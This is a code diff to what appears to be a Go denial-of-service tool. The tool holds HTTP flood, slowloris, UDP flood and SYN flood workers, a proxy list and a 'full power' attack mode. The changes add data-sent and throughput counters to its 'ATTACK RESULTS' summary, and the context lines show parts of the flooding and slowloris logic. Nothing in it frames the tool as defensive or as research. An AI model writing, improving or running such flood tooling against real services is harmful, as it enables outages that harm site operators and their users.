@@ -45,6 +45,7 @@ var (
 	successfulHits uint64
 	failedHits     uint64
 	totalRequests  uint64
+	totalBytes     uint64
 	attackRunning  bool
 	attackMutex    sync.Mutex
 	proxyList      []string
@@ -421,6 +422,10 @@ func launchMultipleInstances(count int, config AttackConfig) {
 
 func launchAttack(config AttackConfig, monitor *ResourceMonitor) {
 	attackRunning = true
+	successfulHits = 0
+	failedHits = 0
+	totalRequests = 0
+	totalBytes = 0
 
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
@@ -520,6 +525,11 @@ func httpFloodWorker(config AttackConfig, method string) {
 			atomic.AddUint64(&failedHits, 1)
 		}
 
+		bytesSize := uint64(800)
+		if method == "POST" {
+			bytesSize = 1824
+		}
+		atomic.AddUint64(&totalBytes, bytesSize)
 		atomic.AddUint64(&totalRequests, 1)
 	}
 }
@@ -575,9 +585,12 @@ func slowlorisWorker(config AttackConfig) {
 
 		conn.Write([]byte(headers))
 		atomic.AddUint64(&successfulHits, 1)
+		atomic.AddUint64(&totalBytes, uint64(len(headers)))
 
 		for i := 0; i < 100 && attackRunning; i++ {
-			conn.Write([]byte(fmt.Sprintf("X-a: %d\r\n", rand.Int())))
+			headerLine := fmt.Sprintf("X-a: %d\r\n", rand.Int())
+			conn.Write([]byte(headerLine))
+			atomic.AddUint64(&totalBytes, uint64(len(headerLine)))
 			time.Sleep(10 * time.Second)
 		}
 
@@ -613,6 +626,7 @@ func udpFloodWorker(config AttackConfig) {
 			atomic.AddUint64(&failedHits, 1)
 		} else {
 			atomic.AddUint64(&successfulHits, 1)
+			atomic.AddUint64(&totalBytes, 1024)
 		}
 		atomic.AddUint64(&totalRequests, 1)
 	}
@@ -635,6 +649,7 @@ func synFloodWorker(config AttackConfig) {
 			atomic.AddUint64(&failedHits, 1)
 		} else {
 			atomic.AddUint64(&successfulHits, 1)
+			atomic.AddUint64(&totalBytes, 200)
 			conn.Close()
 		}
 		atomic.AddUint64(&totalRequests, 1)
@@ -776,6 +791,9 @@ func displayFinalStats(startTime time.Time) {
 	requests := atomic.LoadUint64(&totalRequests)
 	successful := atomic.LoadUint64(&successfulHits)
 	failed := atomic.LoadUint64(&failedHits)
+	bytes := atomic.LoadUint64(&totalBytes)
+
+	tbps := float64(bytes) * 8 / (1024 * 1024 * 1024 * 1024) / elapsed.Seconds()
 
 	fmt.Printf("\n\n%s════════════════════════════════════════════════════%s\n", Blue, Reset)
 	fmt.Printf("%s              ATTACK RESULTS%s\n", Blue, Reset)
@@ -786,7 +804,9 @@ func displayFinalStats(startTime time.Time) {
 	fmt.Printf("%s  Requests Per Second:  %.2f%s\n", Blue, float64(requests)/elapsed.Seconds(), Reset)
 	fmt.Printf("%s  Successful Hits:      %s%d%s\n", Blue, Green, successful, Reset)
 	fmt.Printf("%s  Failed Hits:          %s%d%s\n", Blue, Red, failed, Reset)
-	fmt.Printf("%s  Success Rate:         %.2f%%%s\n\n", Blue, float64(successful)/float64(requests)*100, Reset)
+	fmt.Printf("%s  Success Rate:         %.2f%%%s\n", Blue, float64(successful)/float64(requests)*100, Reset)
+	fmt.Printf("%s  Total Data Sent:      %.2f GB%s\n", Blue, float64(bytes)/(1024*1024*1024), Reset)
+	fmt.Printf("%s  Total Throughput:     %s%.4f TBPS%s\n\n", Blue, Green, tbps, Reset)
 }
 
 func stopAllInstances() {
@@ -973,6 +993,10 @@ func FullPowerAttack() {
 
 func launchFullPowerAttack(config AttackConfig, monitor *ResourceMonitor) {
 	attackRunning = true
+	successfulHits = 0
+	failedHits = 0
+	totalRequests = 0
+	totalBytes = 0
 
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
